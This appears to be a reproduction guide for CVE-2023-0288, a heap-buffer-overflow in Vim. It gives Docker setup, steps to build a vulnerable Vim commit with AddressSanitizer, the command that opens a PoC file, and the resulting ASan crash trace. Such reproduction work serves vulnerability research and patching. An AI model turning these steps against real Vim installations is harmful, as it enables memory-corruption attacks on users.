### CVE-2023-0288

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/de83736a-1936-4872-830b-f1e9b0ad2a74/)

### Docker Container Run Command
```shell
docker build -t cve-2023-0288-poc .
docker run -itd --name CVE-2023-0288-POC cve-2023-0288-poc
docker exec -it CVE-2023-0288-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the Vim repository. (ssh-keygen)
cd /poc
git clone git@github.com:vim/vim.git

# Rollback to the vulnerable version.
cd vim/
git reset --hard 043d7b2c84cda275354aa023b5769660ea70a168

# Install the compilation and installation dependencies for Vim.
apt install gcc make clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Enter the `src` directory.
cd ./src

# Configure, compile, and install Vim.
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# Open the poc file.
vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_hbo02_s.dat -c :qa!
or
ASAN_OPTIONS=detect_leaks=1 vim -u NONE -i NONE -n -m -X -Z -e -s -S /poc/poc_hbo02_s.dat -c :qa!
```

### Description
Observed that (Observing errors may not be unique):
```shell
=================================================================
==9638==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff7dc0b100 at pc 0xffff8255a72c bp 0xffffd87bfea0 sp 0xffffd87bfee8
READ of size 2147479553 at 0xffff7dc0b100 thread T0
#0 0xffff8255a728 in __interceptor_memmove ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:810
#1 0xaaaad0b7581c  (/usr/local/bin/vim+0x4b781c)
#2 0xaaaad0b7bda0  (/usr/local/bin/vim+0x4bdda0)
#3 0xaaaad0b78378  (/usr/local/bin/vim+0x4ba378)
#4 0xaaaad0b78514  (/usr/local/bin/vim+0x4ba514)
#5 0xaaaad0f476bc  (/usr/local/bin/vim+0x8896bc)
#6 0xaaaad0f4473c  (/usr/local/bin/vim+0x88673c)
#7 0xaaaad0f442a8  (/usr/local/bin/vim+0x8862a8)
#8 0xaaaad0c057b0  (/usr/local/bin/vim+0x5477b0)
#9 0xaaaad0c056c4  (/usr/local/bin/vim+0x5476c4)
#10 0xaaaad0be85fc  (/usr/local/bin/vim+0x52a5fc)
#11 0xaaaad0a1a794  (/usr/local/bin/vim+0x35c794)
#12 0xaaaad0a1a4f0  (/usr/local/bin/vim+0x35c4f0)
#13 0xaaaad0a19bc0  (/usr/local/bin/vim+0x35bbc0)
#14 0xaaaad09f0358  (/usr/local/bin/vim+0x332358)
#15 0xaaaad09e5460  (/usr/local/bin/vim+0x327460)
#16 0xaaaad0db6ebc  (/usr/local/bin/vim+0x6f8ebc)
#17 0xaaaad0db8244  (/usr/local/bin/vim+0x6fa244)
#18 0xaaaad0db4788  (/usr/local/bin/vim+0x6f6788)
#19 0xaaaad0db47e4  (/usr/local/bin/vim+0x6f67e4)
#20 0xaaaad09f0358  (/usr/local/bin/vim+0x332358)
#21 0xaaaad09e5460  (/usr/local/bin/vim+0x327460)
#22 0xaaaad09e3398  (/usr/local/bin/vim+0x325398)
#23 0xaaaad111608c  (/usr/local/bin/vim+0xa5808c)
#24 0xaaaad110df0c  (/usr/local/bin/vim+0xa4ff0c)
#25 0xaaaad110d5f4  (/usr/local/bin/vim+0xa4f5f4)
#26 0xffff822a73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#27 0xffff822a74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#28 0xaaaad08183ac  (/usr/local/bin/vim+0x15a3ac)

0xffff7dc0b100 is located 0 bytes to the right of 4096-byte region [0xffff7dc0a100,0xffff7dc0b100)
allocated by thread T0 here:
#0 0xffff825ca2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xaaaad0818904  (/usr/local/bin/vim+0x15a904)
#2 0xaaaad081868c  (/usr/local/bin/vim+0x15a68c)
#3 0xaaaad111abcc  (/usr/local/bin/vim+0xa5cbcc)
#4 0xaaaad1118a6c  (/usr/local/bin/vim+0xa5aa6c)
#5 0xaaaad0b7bf24  (/usr/local/bin/vim+0x4bdf24)
#6 0xaaaad0b686cc  (/usr/local/bin/vim+0x4aa6cc)
#7 0xaaaad083a390  (/usr/local/bin/vim+0x17c390)
#8 0xaaaad1115210  (/usr/local/bin/vim+0xa57210)
#9 0xaaaad110dc60  (/usr/local/bin/vim+0xa4fc60)
#10 0xaaaad110d5f4  (/usr/local/bin/vim+0xa4f5f4)
#11 0xffff822a73f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#12 0xffff822a74c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#13 0xaaaad08183ac  (/usr/local/bin/vim+0x15a3ac)

SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:810 in __interceptor_memmove
Shadow bytes around the buggy address:
0x200fefb815d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fefb815e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fefb815f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fefb81600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200fefb81610: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200fefb81620:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fefb81630: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fefb81640: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fefb81650: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fefb81660: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200fefb81670: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9638==ABORTING
```



